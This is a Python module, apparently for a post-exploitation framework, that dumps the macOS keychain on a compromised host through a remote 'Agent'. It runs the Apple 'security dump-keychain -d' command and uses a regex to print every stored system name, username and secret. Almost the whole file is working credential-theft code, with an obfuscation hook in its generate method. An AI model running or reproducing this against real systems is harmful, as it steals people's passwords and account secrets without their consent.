class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Sandbox-Keychain-Dump',
            'Author': ['@import-au'],
            'Description': ("Uses Apple Security utility to dump the contents of the keychain. "
                            "WARNING: Will prompt user for access to each key."
                            "On Newer versions of Sierra and High Sierra, this will also ask the user for their password for each key."),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                ""
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'OutFile' : {
                'Description': 'File to output AppleScript to, otherwise displayed on the screen.',
                'Required': False,
                'Value': ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = r"""
import subprocess
import re
process = subprocess.Popen('/usr/bin/security dump-keychain -d', stdout=subprocess.PIPE, shell=True)
keychain = process.communicate()
find_account = re.compile('0x00000007\s\<blob\>\=\"([^\"]+)\"\n.*\n.*\"acct\"\<blob\>\=\"([^\"]+)\"\n.*\n.*\n.*\n\s+\"desc\"\<blob\>\=([^\n]+)\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\ndata\:\n([^\n]+)')
accounts = find_account.findall(keychain[0])
for account in accounts:
    print("System: " + account[0])
    print("Description: " + account[2])
    print("Username: " + account[1])
    print("Secret: " + account[3])
"""
        return script